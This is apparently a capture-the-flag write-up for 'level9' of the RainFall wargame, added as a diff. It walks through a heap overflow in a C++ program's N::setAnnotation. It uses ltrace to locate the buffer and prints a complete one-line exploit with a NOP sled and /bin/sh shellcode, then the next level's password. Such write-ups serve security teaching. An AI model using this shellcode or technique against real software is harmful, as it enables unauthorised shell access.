@@ -1,0 +1,41 @@
+in this level the program is written in c++
+there is a class N
+
+the program take 1 argument
+
+it segfault at the offset 108
+
+the segfault occur in the function N::setAnnotation because of the memcpy and the buffer of fixed size
+=> 0x08048682 <+142>:	mov    (%eax),%edx
+
+as we have no other function or anything we will use a shellcode to open a shell
+
+so we have to find our buffer address 
+
+$ ltrace ./level9 $(python -c 'print("A"*110)')
+__libc_start_main(0x80485f4, 2, 0xbffff754, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)                                   = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                                                = 0
+_Znwj(108, 0xbffff754, 0xbffff760, 0xb7d79e55, 0xb7fed280)                                                           = 0x804a008
+_Znwj(108, 5, 0xbffff760, 0xb7d79e55, 0xb7fed280)                                                                    = 0x804a078
+strlen("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                        = 150
+memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 150)                                                       = 0x0804a00c
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+
+so our buffer is at 0x0804a00c
+
+this time instead of putting our shellcode in ENV we will put in directly in our buffer
+
+we have to build our exploit so that  we have  |Shellcode address| + |NOPS| + |shellcode| + [overflowed Address to return to address 1]
+												0x0804a00c + 4			\x90...			...				0x0804a00c
+													4b					79b		29b				4b  = 112
+the total must be 108 + 4 bytes
+
+
+level9@RainFall:~$ ./level9 $(python -c 'print("\x08\x04\xa0\x10"[::-1]+"\x90"*79+"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"+"\x08\x04\xa0\x0c"[::-1])')
+$ cd ../bonus0 ; cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+
